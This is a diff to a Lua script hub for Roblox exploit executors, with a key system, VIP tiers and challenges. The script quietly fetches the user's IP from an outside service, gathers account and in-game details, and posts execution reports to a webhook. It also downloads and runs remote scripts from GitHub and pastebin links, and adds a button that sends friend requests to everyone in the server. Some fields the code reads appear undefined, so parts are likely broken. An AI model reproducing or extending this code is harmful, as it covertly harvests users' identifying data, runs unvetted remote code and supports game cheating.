@@ -20,18 +20,17 @@ local CONFIG = {
     HTTP_TIMEOUT = 15,
     FEEDBACK_COOLDOWN = 4500,
     REFRESH_INTERVAL = 180,
-    VERSION = "1.4.0", -- Bumped to reflect major upgrades
+    VERSION = "1.4.0",
     VIP_PERKS = {
         SCRIPT_BOOST = "https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/VIP_Boost",
-        EXCLUSIVE_UI = "https://pastebin.com/raw/your_exclusive_ui",
-        PREMIUM_THEMES = {"Dark", "Light", "Blood", "Aqua"}
+        EXCLUSIVE_UI = "https://pastebin.com/raw/your_exclusive_ui"
     }
 }
 
 local VaultDataStore
 local function initializeDataStore()
     local success, ds = pcall(function()
-        return DataStoreService:GetDataStore("VaultData_v2") -- Updated version for new data
+        return DataStoreService:GetDataStore("VaultData_v1")
     end)
     if success then
         VaultDataStore = ds
@@ -109,6 +108,7 @@ end
 
 local function getPlayerInfo()
     local info = {}
+    
     info.UserId = LocalPlayer.UserId
     info.Username = LocalPlayer.Name
     info.DisplayName = LocalPlayer.DisplayName
@@ -118,21 +118,35 @@ local function getPlayerInfo()
     info.AccountAge = LocalPlayer.AccountAge
     info.JoinDate = os.date("%Y-%m-%d", os.time() - (LocalPlayer.AccountAge * 86400))
     info.MembershipType = tostring(LocalPlayer.MembershipType)
-    info.FollowerCount = LocalPlayer.FollowerCount
-    info.FollowingCount = LocalPlayer.FollowingCount
+    info.Followers = LocalPlayer.FollowersCount
+    info.Following = LocalPlayer.FollowingCount
     info.FriendCount = #Players:GetFriendsAsync(LocalPlayer.UserId):GetCurrentPage()
     
     local success, ip = pcall(function()
         return game:HttpGet("https://api.ipify.org")
     end)
-    info.IP = success and ip or "Unknown (Fetch Failed)"
+    info.IP = success and ip or "Unable to fetch IP"
     
     info.Executor = identifyexecutor and identifyexecutor() or "Unknown"
     info.FPS = math.floor(1 / RunService.RenderStepped:Wait())
     info.Ping = math.floor(LocalPlayer:GetNetworkPing() * 1000) .. "ms"
     info.GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-    info.LastLogin = os.date("%Y-%m-%d %H:%M:%S", getDataStore("lastLogin", os.time()))
-    info.RobuxBalance = "Hidden (API Limited)" -- Roblox API restricts this
+    info.RobuxBalance = LocalPlayer:FindFirstChild("RobuxBalance") and LocalPlayer.RobuxBalance.Value or "N/A"
+    info.LastLocation = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and tostring(LocalPlayer.Character.HumanoidRootPart.Position) or "N/A"
+    info.Health = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid.Health or "N/A"
+    info.WalkSpeed = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid.WalkSpeed or "N/A"
+    info.JumpPower = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid.JumpPower or "N/A"
+    
+    local badges = {}
+    local badgeSuccess, badgeEnum = pcall(function()
+        return game:GetService("BadgeService"):GetBadgesAsync(LocalPlayer.UserId)
+    end)
+    if badgeSuccess then
+        for _, badge in ipairs(badgeEnum:GetCurrentPage()) do
+            table.insert(badges, badge.Name)
+        end
+    end
+    info.Badges = #badges > 0 and table.concat(badges, ", ") or "None"
     
     return info
 end
@@ -288,8 +302,8 @@ local webhookSystem = {
         local hours = math.floor(seconds / 3600)
         local minutes = math.floor((seconds % 3600) / 60)
         local secs = math.floor(seconds % 60)
-        if hours > 0 then return string.format("%d:%02d:%02d", hours, minutes, secs)
-        elseif minutes > 0 then return string.format("%d:%02d", minutes, secs)
+        if hours > 0 then return string.format("%d hrs, %d min", hours, minutes)
+        elseif minutes > 0 then return string.format("%d min, %d sec", minutes, secs)
         else return string.format("%d sec", secs) end
     end,
     
@@ -307,7 +321,7 @@ local webhookSystem = {
         local batch = {}
         for i = 1, math.min(self.batchSize, #self.queue) do
             local embed = table.remove(self.queue, 1)
-            embed.footer = embed.footer or { text = "Vault v" .. CONFIG.VERSION .. " | " .. os.date("%H:%M UTC") }
+            embed.footer = embed.footer or { text = "Vault v" .. CONFIG.VERSION }
             embed.timestamp = embed.timestamp or os.date("!%Y-%m-%dT%H:%M:%SZ")
             if embed.title == "Script Execution" then
                 embed.components = {
@@ -315,8 +329,7 @@ local webhookSystem = {
                         type = 1,
                         components = {
                             { type = 2, style = 3, label = "Blacklist", custom_id = "blacklist_" .. LocalPlayer.UserId },
-                            { type = 2, style = 2, label = "Whitelist", custom_id = "whitelist_" .. LocalPlayer.UserId },
-                            { type = 2, style = 1, label = "Details", custom_id = "details_" .. LocalPlayer.UserId }
+                            { type = 2, style = 2, label = "Whitelist", custom_id = "whitelist_" .. LocalPlayer.UserId }
                         }
                     }
                 }
@@ -431,7 +444,8 @@ local challengeSystem = {
         {id = "login_streak", name = "Login Streak", progress = 0, goal = 5, reward = "50 VC"},
         {id = "feedback_pro", name = "Feedback Pro", progress = 0, goal = 3, reward = "VIP Extension (1 day)"},
         {id = "script_usage", name = "Script Enthusiast", progress = 0, goal = 10, reward = "Exclusive Script"},
-        {id = "social_star", name = "Social Star", progress = 0, goal = 3, reward = "100 VC"}
+        {id = "explorer", name = "Game Explorer", progress = 0, goal = 5, reward = "100 VC"},
+        {id = "socialite", name = "Socialite", progress = 0, goal = 10, reward = "VIP UI Theme"}
     },
     
     load = function(self)
@@ -497,9 +511,12 @@ local challengeSystem = {
                 elseif challenge.id == "script_usage" then
                     scriptSystem:loadScript(CONFIG.VIP_PERKS.EXCLUSIVE_UI, true)
                     Rayfield:Notify({Title = "Reward Claimed", Content = "Exclusive Script Unlocked for Script Enthusiast!", Duration = 5})
-                elseif challenge.id == "social_star" then
+                elseif challenge.id == "explorer" then
                     setDataStore("vaultCredits", (getDataStore("vaultCredits", 0) or 0) + 100)
-                    Rayfield:Notify({Title = "Reward Claimed", Content = "Received 100 VC for Social Star!", Duration = 5})
+                    Rayfield:Notify({Title = "Reward Claimed", Content = "Received 100 VC for Game Explorer!", Duration = 5})
+                elseif challenge.id == "socialite" then
+                    setLocalStorage("customThemeUnlocked", true)
+                    Rayfield:Notify({Title = "Reward Claimed", Content = "VIP UI Theme Unlocked for Socialite!", Duration = 5})
                 end
                 self:resetProgress(challengeId)
                 return true
@@ -521,9 +538,7 @@ local newsSystem = {
         local formatted = "Vault Chronicle\n==================\n"
         for i, line in ipairs(lines) do
             if line:match("^NEWS:") then
-                formatted = formatted .. "📰 " .. line:gsub("^NEWS:%s*", "") .. "\n"
-            elseif line:match("^TIP:") then
-                formatted = formatted .. "💡 " .. line:gsub("^TIP:%s*", "") .. "\n"
+                formatted = formatted .. line:gsub("^NEWS:%s*", "") .. "\n"
             else
                 formatted = formatted .. "- " .. line .. "\n"
             end
@@ -568,7 +583,6 @@ if accessControl:isBlacklisted(LocalPlayer.UserId) then
 end
 
 local playerInfo = getPlayerInfo()
-setDataStore("lastLogin", os.time())
 
 webhookSystem:send({
     title = "Script Execution",
@@ -587,7 +601,10 @@ webhookSystem:send({
         { name = "VIP", value = subscriptionSystem:isSubscribed(LocalPlayer.UserId) and "Yes" or "No", inline = true },
         { name = "Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true },
         { name = "Membership", value = playerInfo.MembershipType, inline = true },
-        { name = "FPS", value = playerInfo.FPS .. " FPS", inline = true },
+        { name = "Followers", value = tostring(playerInfo.Followers), inline = true },
+        { name = "Following", value = tostring(playerInfo.Following), inline = true },
+        { name = "Friends", value = tostring(playerInfo.FriendCount), inline = true },
+        { name = "FPS", value = playerInfo.FPS, inline = true },
         { name = "Ping", value = playerInfo.Ping, inline = true }
     }
 })
@@ -597,8 +614,8 @@ local success, err = pcall(function()
     Window = Rayfield:CreateWindow({
         Name = "ComboChronicle Vault | NextGen v" .. CONFIG.VERSION,
         LoadingTitle = "Initializing Vault",
-        LoadingSubtitle = "By COMBO_WICK | Bang.E.Line | Enhanced Edition",
-        Theme = getLocalStorage("theme", "Ocean")
+        LoadingSubtitle = "By COMBO_WICK | Bang.E.Line",
+        Theme = "Ocean"
     })
 end)
 if not success then
@@ -614,13 +631,14 @@ local keyInput = KeyTab:CreateInput({
         Rayfield:Notify({Title = "Checking", Content = "Verifying key...", Duration = 2})
         task.wait(0.7)
         if keySystem:verify(input) then
-            Rayfield:Notify({Title = "Success", Content = "Access granted! Welcome to the Vault!", Duration = 3})
+            Rayfield:Notify({Title = "Success", Content = "Access granted!", Duration = 3})
             challengeSystem:updateProgress("login_streak")
             local gameId = game.PlaceId
             local scriptToLoad = scriptSystem:getScriptForGame(gameId)
             task.wait(1)
             Rayfield:Destroy()
             scriptSystem:loadScriptSet(scriptToLoad, true)
+            challengeSystem:updateProgress("explorer")
         else
             Rayfield:Notify({Title = "Invalid", Content = "Join Discord for key or check input!", Duration = 5, Image = 4483362458})
         end
@@ -632,13 +650,12 @@ KeyTab:CreateButton({
     Callback = function()
         setclipboard("Discord: discord.com/invite/mwTHaCKzhw\nYouTube: https://www.youtube.com/@COMBO_WICK")
         Rayfield:Notify({Title = "Copied", Content = "Links copied!", Duration = 5})
-        challengeSystem:updateProgress("social_star")
     end
 })
 
 KeyTab:CreateParagraph({
     Title = "Credits",
-    Content = "Script by COMBO_WICK & Star\nVersion: " .. CONFIG.VERSION .. "\nAccess: " .. accessControl:getStatus(LocalPlayer.UserId) .. "\nEnhanced by xAI\nEnjoy the Ultimate Vault Experience!"
+    Content = "Script by COMBO_WICK & Star\nVersion: " .. CONFIG.VERSION .. "\nAccess: " .. accessControl:getStatus(LocalPlayer.UserId) .. "\nEnjoy the Vault!"
 })
 
 local ResponseTab = Window:CreateTab("Responses", 4483362458)
@@ -646,7 +663,7 @@ local ResponseSection = ResponseTab:CreateSection("Message System")
 local currentResponse = ""
 ResponseTab:CreateInput({
     Name = "Your Message",
-    PlaceholderText = "Share thoughts, report bugs, or suggest features...",
+    PlaceholderText = "Share thoughts or report bugs...",
     RemoveTextAfterFocusLost = false,
     Callback = function(text) currentResponse = text end
 })
@@ -673,11 +690,11 @@ ResponseTab:CreateButton({
             fields = {
                 { name = "User", value = LocalPlayer.DisplayName, inline = true },
                 { name = "ID", value = tostring(LocalPlayer.UserId), inline = true },
-                { name = "Game", value = playerInfo.GameName .. " (" .. tostring(game.PlaceId) .. ")", inline = true },
+                { name = "Game", value = tostring(game.PlaceId), inline = true },
                 { name = "Status", value = accessControl:getStatus(LocalPlayer.UserId), inline = true }
             }
         })
-        Rayfield:Notify({Title = "Sent", Content = "Feedback delivered! Thank you!", Duration = 5, Image = 4483362458})
+        Rayfield:Notify({Title = "Sent", Content = "Feedback delivered!", Duration = 5, Image = 4483362458})
         local feedbackCount = (getDataStore("feedbackCount", 0) or 0) + 1
         setDataStore("feedbackCount", feedbackCount)
         challengeSystem:updateProgress("feedback_pro")
@@ -691,7 +708,7 @@ ResponseTab:CreateButton({
 })
 
 ResponseTab:CreateLabel("Cooldown: 1h 15m")
-ResponseTab:CreateLabel("Help us improve with your input!")
+ResponseTab:CreateLabel("Bugs or suggestions welcome!")
 
 local NewsTab = Window:CreateTab("News", 4483362458)
 local newsParagraph = NewsTab:CreateParagraph({
@@ -734,10 +751,9 @@ if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
             subParagraph:Set({
                 Title = "Vault Elite",
                 Content = "Status: Subscribed\n" ..
-                          "Perks: VIP Scripts, Priority Support, Boosts, Premium Themes\n" ..
+                          "Perks: VIP Scripts, Priority Support, Boosts, Custom UI\n" ..
                           "Expires in: " .. timeRemaining .. "\n" ..
-                          "Access: " .. accessControl:getStatus(LocalPlayer.UserId) .. "\n" ..
-                          "Exclusive Bonus: Early Access to Updates"
+                          "Access: " .. accessControl:getStatus(LocalPlayer.UserId)
             })
         else
             subParagraph:Set({
@@ -766,7 +782,6 @@ if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
         Callback = function()
             setclipboard("discord.com/invite/mwTHaCKzhw")
             Rayfield:Notify({Title = "Subscription", Content = "Discord copied! Contact admins.", Duration = 5})
-            challengeSystem:updateProgress("social_star")
         end
     })
     
@@ -796,26 +811,11 @@ if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
         end
     })
     
-    SubTab:CreateDropdown({
-        Name = "Select Premium Theme",
-        Options = CONFIG.VIP_PERKS.PREMIUM_THEMES,
-        CurrentOption = getLocalStorage("theme", "Ocean"),
-        Callback = function(theme)
-            if subscriptionSystem:isSubscribed(LocalPlayer.UserId) then
-                Window:SetTheme(theme)
-                setLocalStorage("theme", theme)
-                Rayfield:Notify({Title = "Theme Changed", Content = "Now using " .. theme .. " theme!", Duration = 4})
-            else
-                Rayfield:Notify({Title = "Denied", Content = "VIP only feature!", Duration = 5})
-            end
-        end
-    })
-    
     if not getDataStore("VIPBadgeShown", false) then
         wait(3)
         Rayfield:Notify({
             Title = "VIP Badge",
-            Content = "Welcome, Vault Elite Member!\nUnlock exclusive perks and shine bright!",
+            Content = "Welcome, Vault Elite Member!\nEnjoy your exclusive perks.",
             Duration = 10,
             Image = 4483362458
         })
@@ -873,22 +873,25 @@ SettingsTab:CreateToggle({
     end
 })
 
-SettingsTab:CreateSlider({
-    Name = "UI Scale",
-    Range = {0.5, 1.5},
-    Increment = 0.1,
-    CurrentValue = getLocalStorage("uiScale", 1),
+SettingsTab:CreateToggle({
+    Name = "Custom Theme",
+    CurrentValue = getLocalStorage("customThemeEnabled", false),
+    Flag = "customThemeToggle",
     Callback = function(value)
-        setLocalStorage("uiScale", value)
-        Rayfield:Notify({Title = "Settings", Content = "UI scale set to " .. value .. "x", Duration = 3})
-        -- Note: Rayfield doesn't natively support UI scaling; this is a placeholder for future enhancement
+        if value and not getLocalStorage("customThemeUnlocked", false) then
+            Rayfield:Notify({Title = "Locked", Content = "Unlock via Socialite challenge!", Duration = 5})
+            return
+        end
+        setLocalStorage("customThemeEnabled", value)
+        Window:SetTheme(value and "Dark" or "Ocean")
+        Rayfield:Notify({Title = "Settings", Content = value and "Custom theme on" or "Default theme on", Duration = 3})
     end
 })
 
 SettingsTab:CreateButton({
     Name = "Clear Cache",
     Callback = function()
-        for _, attr in ipairs({"notificationsEnabled", "autoUpdateEnabled", "newsCache", "VIPBadgeShown", "theme", "uiScale"}) do
+        for _, attr in ipairs({"notificationsEnabled", "autoUpdateEnabled", "newsCache", "VIPBadgeShown", "customThemeEnabled"}) do
             pcall(function() LocalPlayer:SetAttribute(attr, nil) end)
         end
         Rayfield:Notify({Title = "Cleaned", Content = "Cache cleared! Restart to apply.", Duration = 5})
@@ -917,20 +920,30 @@ local function updateAnalytics()
     local feedbackCount = getDataStore("feedbackCount", 0) or 0
     local vaultCredits = getDataStore("vaultCredits", 0) or 0
     local subStatus = subscriptionSystem:isSubscribed(LocalPlayer.UserId) and "Active" or "Inactive"
-    local scriptUsage = getDataStore("scriptUsageCount", 0) or 0
-    local uptime = math.floor(tick() / 60) .. " min"
-    local content = "User: " .. LocalPlayer.DisplayName .. " (ID: " .. playerInfo.UserId .. ")\n" ..
+    local playerInfo = getPlayerInfo()
+    local content = "User: " .. playerInfo.DisplayName .. " (@" .. playerInfo.Username .. ")\n" ..
+                    "User ID: " .. playerInfo.UserId .. "\n" ..
+                    "HWID: " .. playerInfo.HWID .. "\n" ..
+                    "IP: " .. playerInfo.IP .. "\n" ..
                     "Logins: " .. loginCount .. "\n" ..
                     "Feedback Sent: " .. feedbackCount .. "\n" ..
                     "Vault Credits: " .. vaultCredits .. "\n" ..
                     "Subscription: " .. subStatus .. "\n" ..
-                    "Scripts Loaded: " .. scriptUsage .. "\n" ..
-                    "Uptime: " .. uptime .. "\n" ..
-                    "FPS: " .. playerInfo.FPS .. " | Ping: " .. playerInfo.Ping .. "\n" ..
-                    "Membership: " .. playerInfo.MembershipType .. "\n" ..
-                    "Friends: " .. playerInfo.FriendCount .. " | Followers: " .. playerInfo.FollowerCount .. "\n" ..
                     "Access: " .. accessControl:getStatus(LocalPlayer.UserId) .. "\n" ..
-                    "Last Login: " .. playerInfo.LastLogin
+                    "Membership: " .. playerInfo.MembershipType .. "\n" ..
+                    "Followers: " .. playerInfo.Followers .. "\n" ..
+                    "Following: " .. playerInfo.Following .. "\n" ..
+                    "Friends: " .. playerInfo.FriendCount .. "\n" ..
+                    "Game: " .. playerInfo.GameName .. " (" .. playerInfo.GameId .. ")\n" ..
+                    "Server: " .. playerInfo.JobId .. "\n" ..
+                    "FPS: " .. playerInfo.FPS .. "\n" ..
+                    "Ping: " .. playerInfo.Ping .. "\n" ..
+                    "Robux: " .. playerInfo.RobuxBalance .. "\n" ..
+                    "Position: " .. playerInfo.LastLocation .. "\n" ..
+                    "Health: " .. playerInfo.Health .. "\n" ..
+                    "WalkSpeed: " .. playerInfo.WalkSpeed .. "\n" ..
+                    "JumpPower: " .. playerInfo.JumpPower .. "\n" ..
+                    "Badges: " .. playerInfo.Badges
     analyticsParagraph:Set({Title = "Your Stats", Content = content})
 end
 
@@ -941,61 +954,52 @@ end)
 
 AnalyticsTab:CreateButton({
     Name = "Refresh Stats",
-    Callback = function() 
-        playerInfo = getPlayerInfo() -- Refresh dynamic data
-        updateAnalytics() 
-    end
+    Callback = function() updateAnalytics() end
 })
 
 AnalyticsTab:CreateButton({
-    Name = "Share Stats",
+    Name = "Copy Stats",
     Callback = function()
-        local stats = analyticsParagraph.Content
-        setclipboard(stats)
+        local playerInfo = getPlayerInfo()
+        local statsText = "Vault Stats for " .. playerInfo.DisplayName .. ":\n" ..
+                          "User ID: " .. playerInfo.UserId .. "\n" ..
+                          "IP: " .. playerInfo.IP .. "\n" ..
+                          "HWID: " .. playerInfo.HWID .. "\n" ..
+                          "Game: " .. playerInfo.GameName .. "\n" ..
+                          "FPS: " .. playerInfo.FPS .. "\n" ..
+                          "Ping: " .. playerInfo.Ping
+        setclipboard(statsText)
         Rayfield:Notify({Title = "Copied", Content = "Stats copied to clipboard!", Duration = 5})
-        challengeSystem:updateProgress("social_star")
     end
 })
 
-local ToolsTab = Window:CreateTab("Tools", 4483362458)
-ToolsTab:CreateButton({
-    Name = "Server Hop",
+local SocialTab = Window:CreateTab("Social", 4483362458)
+SocialTab:CreateButton({
+    Name = "Friend All in Server",
     Callback = function()
-        Rayfield:Notify({Title = "Server Hop", Content = "Switching servers...", Duration = 3})
-        local servers = game:GetService("TeleportService"):GetServerListAsync(game.PlaceId):GetCurrentPage()
-        if #servers > 0 then
-            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)].Id)
-        else
-            Rayfield:Notify({Title = "Error", Content = "No servers found!", Duration = 5})
-        end
-    end
-})
-
-ToolsTab:CreateButton({
-    Name = "Rejoin Server",
-    Callback = function()
-        Rayfield:Notify({Title = "Rejoin", Content = "Rejoining current server...", Duration = 3})
-        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
-    end
-})
-
-ToolsTab:CreateInput({
-    Name = "Teleport to Player",
-    PlaceholderText = "Enter player name...",
-    Callback = function(targetName)
-        local target = nil
-        for _, player in pairs(Players:GetPlayers()) do
-            if player.Name:lower():find(targetName:lower()) or player.DisplayName:lower():find(targetName:lower()) then
-                target = player
-                break
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                pcall(function()
+                    LocalPlayer:RequestFriendship(player)
+                end)
             end
         end
-        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-            LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = target.Character.HumanoidRootPart.CFrame
-            Rayfield:Notify({Title = "Teleport", Content = "Teleported to " .. target.DisplayName .. "!", Duration = 4})
-        else
-            Rayfield:Notify({Title = "Error", Content = "Player not found or no character!", Duration = 5})
+        Rayfield:Notify({Title = "Social", Content = "Friend requests sent!", Duration = 5})
+        challengeSystem:updateProgress("socialite", #Players:GetPlayers() - 1)
+        if challengeSystem:awardReward("socialite") then
+            Rayfield:Notify({Title = "Reward", Content = "VIP UI Theme Unlocked!", Duration = 5})
         end
+    end
+})
+
+SocialTab:CreateButton({
+    Name = "List Players",
+    Callback = function()
+        local playerList = "Players in Server:\n"
+        for i, player in ipairs(Players:GetPlayers()) do
+            playerList = playerList .. i .. ". " .. player.DisplayName .. " (@" .. player.Name .. ")\n"
+        end
+        Rayfield:Notify({Title = "Server List", Content = playerList, Duration = 10})
     end
 })
 
@@ -1003,6 +1007,11 @@ if subscriptionSystem:isSubscribed(LocalPlayer.UserId) and getLocalStorage("auto
     spawn(function()
         wait(5)
         scriptSystem:loadScript(scriptSystem.vipScript, true)
-        setDataStore("scriptUsageCount", (getDataStore("scriptUsageCount", 0) or 0) + 1)
     end)
 end
+
+spawn(function()
+    while wait(10) do
+        updateAnalytics()
+    end
+end)
